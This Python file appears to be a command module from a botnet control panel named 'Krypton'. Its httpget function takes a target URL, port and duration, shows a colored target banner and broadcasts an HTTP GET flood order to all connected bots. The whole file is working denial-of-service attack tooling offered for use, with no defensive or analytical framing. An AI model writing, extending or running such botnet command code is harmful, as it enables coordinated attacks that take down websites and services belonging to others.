import time
from colorama import Fore

def httpget(args, validate_time, send, client, ansi_clear, broadcast, data):
    if len(args) == 4:
        url = args[1]
        port = args[2]
        secs = args[3]

        xxxx = '''%s============= (%sTARGET%s) ==============
            %s URL:%s %s
            %sPORT:%s %s
            %sTIME:%s %s
          %sMETHOD:%s %s'''%(Fore.LIGHTBLACK_EX, Fore.GREEN, Fore.LIGHTBLACK_EX, Fore.CYAN, Fore.LIGHTWHITE_EX, url, Fore.CYAN, Fore.LIGHTWHITE_EX, port, Fore.CYAN, Fore.LIGHTWHITE_EX, secs,Fore.CYAN, Fore.LIGHTWHITE_EX, 'HTTP GET')

        if validate_time(secs):
            for x in xxxx.split('\n'):
                send(client, '\x1b[3;31;40m'+ x)
            send(client, f" {Fore.LIGHTBLACK_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTBLACK_EX} sent to all Krypton Bots!\n")
            broadcast(data)
        else:
            send(client, Fore.RED + '\nInvalid attack duration (1-1200 seconds)\n')
    else:
        send(client, f'\nUsage: {Fore.LIGHTBLACK_EX}.httpget [URL] [PORT] [TIME]\n')
